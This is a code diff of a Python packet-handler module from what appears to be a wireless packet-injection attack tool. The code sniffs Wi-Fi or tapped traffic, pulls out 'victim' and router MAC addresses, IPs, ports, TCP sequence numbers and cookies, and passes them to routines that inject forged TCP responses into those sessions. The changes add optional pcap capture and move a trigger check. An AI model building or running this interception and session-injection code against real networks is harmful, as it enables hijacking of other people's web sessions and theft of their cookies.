@@ -1,7 +1,10 @@
 from lib.injector import Injector
 from lib.victim import Victim
-from scapy.all import *
-#import socket, time
+from scapy.layers.dot11 import RadioTap, Dot11, Dot11QoS
+from scapy.layers.l2 import Ether, LLC, SNAP
+from scapy.layers.inet import IP, TCP
+from scapy.packet import Raw
+from scapy.utils import wrpcap
 import socket
 
 global BLOCK_HOSTS
@@ -53,6 +56,7 @@ class PacketHandler(object):
 
         ## Argument handling
         args = keyword_parameters['Args']
+        self.nic = args.mon
         self.single = args.single
         self.verbose = args.v
         if args.trigger is None:
@@ -61,7 +65,8 @@ class PacketHandler(object):
             self.trigger = args.trigger
 
         self.newvictims = []
-        self.injector = Injector(self.i)
+        self.injector = Injector(self.i, args)
+        #print 'packet_handler has instantiated Injector()'
 
 
     def cookieManager(self,
@@ -363,8 +368,7 @@ class PacketHandler(object):
                              seqnum,
                              injection,
                              TSVal,
-                             TSecr,
-                             args)
+                             TSecr)
         #print 'sent'
 
 
@@ -406,49 +410,48 @@ class PacketHandler(object):
         return processed
 
 
-    def proc_handler(self, packet):
-        """Process handler
-        
-        Obtains specific bits of the packet, orders them accordingly
+    def proc_handler(self, packet, args):
+        """Process handler responsible for the last mile of packet filtering
+        Obtains packet specific information and stores it to memory
         """
         if packet.haslayer(IP) and packet.haslayer(TCP):
 
-            ## MONITOR MODE
-            if packet.haslayer(Dot11) and not packet.haslayer(Ether):
-                vicmac = packet.getlayer(Dot11).addr2
-                rtrmac = packet.getlayer(Dot11).addr1
-
-            ## TAP MODE
-            else:
-                vicmac = packet.getlayer(Ether).src
-                rtrmac = packet.getlayer(Ether).dst
-
-            vicip = packet.getlayer(IP).src
-            svrip = packet.getlayer(IP).dst
-            vicport = packet.getlayer(TCP).sport
-            svrport = packet.getlayer(TCP).dport
-            size = len(packet.getlayer(TCP).load)
-            acknum = str(int(packet.getlayer(TCP).seq) + size)
-            seqnum = packet.getlayer(TCP).ack
+            ## Trigger check
             request = self.requestExtractor(packet)
-            global BLOCK_HOSTS
-            for obj in BLOCK_HOSTS:
-                ip, seq = obj
-                if svrip == ip and seqnum != seq:
-                    #print "REMOVING ", svrip
-                    for obj2 in BLOCK_HOSTS:
-                        ip2, seq2 = obj2
-                        if ip2 == svrip:
-                            BLOCK_HOSTS.remove((ip2, seq2))
-
             if self.trigger in request:
-                if self.verbose and request:
-                    print '\n\n%s' % request
-                pass
+
+                ## MONITOR MODE
+                if self.nic == 'mon':
+                    vicmac = packet.getlayer(Dot11).addr2
+                    rtrmac = packet.getlayer(Dot11).addr1
+
+                ## TAP MODE
+                else:
+                    vicmac = packet.getlayer(Ether).src
+                    rtrmac = packet.getlayer(Ether).dst
+
+                vicip = packet.getlayer(IP).src
+                svrip = packet.getlayer(IP).dst
+                vicport = packet.getlayer(TCP).sport
+                svrport = packet.getlayer(TCP).dport
+                size = len(packet.getlayer(TCP).load)
+                acknum = str(int(packet.getlayer(TCP).seq) + size)
+                seqnum = packet.getlayer(TCP).ack
+                global BLOCK_HOSTS
+                for obj in BLOCK_HOSTS:
+                    ip, seq = obj
+                    if svrip == ip and seqnum != seq:
+                        #print "REMOVING ", svrip
+                        for obj2 in BLOCK_HOSTS:
+                            ip2, seq2 = obj2
+                            if ip2 == svrip:
+                                BLOCK_HOSTS.remove((ip2, seq2))
+                if args.pcap:
+                    wrpcap('inbound.pcap', packet)
             else:
                 return 0
+
             #print BLOCK_HOSTS
-            #print request
 
             try:
                 TSVal, TSecr = packet.getlayer(TCP).options[2][1]
@@ -665,49 +668,44 @@ class PacketHandler(object):
         for GET requests for injection and cookies.
         """
         ## You can write your own handler for packets
-        if self.handler is not None:
-            self.handler(interface, pkt)
-        else:
-            try:
-                vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr = self.proc_handler(pkt)
-                
-                self.cookieManager(vicmac,
-                                   rtrmac,
-                                   vicip,
-                                   svrip,
-                                   vicport,
-                                   svrport,
-                                   acknum,
-                                   seqnum,
-                                   request,
-                                   cookie,
-                                   args)
-                
-                self.proc_injection(vicmac,
-                                    rtrmac,
-                                    vicip,
-                                    svrip,
-                                    vicport,
-                                    svrport,
-                                    acknum,
-                                    seqnum,
-                                    request,
-                                    cookie,
-                                    TSVal,
-                                    TSecr,
-                                    args)
-            except:
-                return
+        ## If wanted, do something like:
+        #if self.handler is not None:
+            #self.handler(interface, pkt, args)
+        #else:
+        try:
+            vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr = self.proc_handler(pkt, args)
+            
+            self.cookieManager(vicmac,
+                                rtrmac,
+                                vicip,
+                                svrip,
+                                vicport,
+                                svrport,
+                                acknum,
+                                seqnum,
+                                request,
+                                cookie,
+                                args)
+            
+            self.proc_injection(vicmac,
+                                rtrmac,
+                                vicip,
+                                svrip,
+                                vicport,
+                                svrport,
+                                acknum,
+                                seqnum,
+                                request,
+                                cookie,
+                                TSVal,
+                                TSecr,
+                                args)
+        except:
+            return
  
  
     def requestExtractor(self, pkt):
-        """Extracts request payload as a string from the packet object
-        
-        This is where we can see the return from the server for the Domain=
-        Needed for cookieExtractor() in logger.py
-        """
-
-        #print pkt.sprintf("{IP:%IP.src% -> %IP.dst%\n}{Raw:%Raw.load%\n}")
+        """Extracts the payload for trigger processing"""
         ret2 = "\n".join(pkt.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
         if len(ret2.strip()) > 0:
             return ret2.translate(None, "'").strip()
